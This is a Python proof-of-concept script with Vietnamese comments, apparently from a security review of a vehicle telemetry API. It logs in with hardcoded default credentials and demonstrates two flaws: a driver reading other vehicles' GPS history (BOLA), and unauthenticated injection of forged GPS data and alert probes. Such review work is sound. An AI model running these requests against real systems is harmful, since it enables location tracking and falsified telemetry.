#!/usr/bin/env python3
"""
P-136 — PoC phân quyền & telemetry:
  (C) BOLA: tài xế đọc lịch sử GPS của xe KHÔNG thuộc về mình (GET /telemetry/vehicles/{id}/history chỉ cần đăng nhập).
  (D) Missing Auth (CWE-306): POST /telemetry/gps và /telemetry/alert KHÔNG yêu cầu xác thực.
"""
import json, time, uuid
import requests

BASE = "http://<REDACTED_IP>:8000/api/v1"
OUT = "/home/hieubt15/Documents/demo-review-cohort4/reviews/P-136/evidences"

def login(u, p):
    r = requests.post(f"{BASE}/auth/login", json={"username": u, "password": p}, timeout=20)
    return r.json()["data"]["access_token"]

res = {"ts": time.strftime("%Y-%m-%d %H:%M:%S%z"), "base": BASE}

# admin token để lấy danh sách xe
admin = login("admin", "Admin@123")
driver = login("driver1", "Driver@123")
vehicles = requests.get(f"{BASE}/vehicles", headers={"Authorization": f"Bearer {admin}"}, timeout=20).json()
vlist = [v.get("id") or v.get("vehicle_id") for v in vehicles.get("data", {}).get("items", vehicles.get("data", []))] if isinstance(vehicles.get("data"), (list, dict)) else []
res["vehicles_seen_by_admin"] = vlist
print("vehicles:", vlist)

# (C) BOLA: driver đọc history mọi xe
res["bola_history"] = {}
for vid in vlist[:5]:
    r = requests.get(f"{BASE}/telemetry/vehicles/{vid}/history?limit=3",
                     headers={"Authorization": f"Bearer {driver}"}, timeout=20)
    res["bola_history"][vid] = {"status": r.status_code, "n_points": len(r.json().get("data", [])) if r.status_code == 200 else None}
    print(f"[BOLA] driver1 GET history {vid} -> {r.status_code} points={res['bola_history'][vid]['n_points']}")

# (D) Missing auth ingestion — gửi KHÔNG kèm token
gps_payload = {
    "vehicle_id": vlist[0] if vlist else "veh_vinfast_vf8_02",
    "timestamp": "2026-10-13T10:00:00Z",
    "location": {"latitude": 21.0285, "longitude": 105.8542, "speed_kmh": 999, "heading": 0},
    "road_type": "URBAN",
    "address_label": "PWNED-TEST-INJECTED-GPS",
}
r = requests.post(f"{BASE}/telemetry/gps", json=gps_payload, timeout=20)  # no auth header
res["unauth_gps"] = {"status": r.status_code, "body": (r.json() if r.headers.get("content-type","").startswith("application/json") else r.text)}
print(f"[NOAUTH] POST /telemetry/gps (no token) -> {r.status_code}")

# alert: gửi payload rỗng, không token. 401 => có auth; 422 => KHÔNG auth (đã qua tầng auth tới validation)
r2 = requests.post(f"{BASE}/telemetry/alert", json={}, timeout=20)
res["unauth_alert_probe"] = {"status": r2.status_code,
    "interpret": "422 = KHÔNG yêu cầu auth (chạm tới validation); 401/403 = có auth"}
print(f"[NOAUTH] POST /telemetry/alert empty (no token) -> {r2.status_code}")

with open(f"{OUT}/02_authz_telemetry.json", "w", encoding="utf-8") as f:
    json.dump(res, f, ensure_ascii=False, indent=2, default=str)
print("saved ->", f"{OUT}/02_authz_telemetry.json")
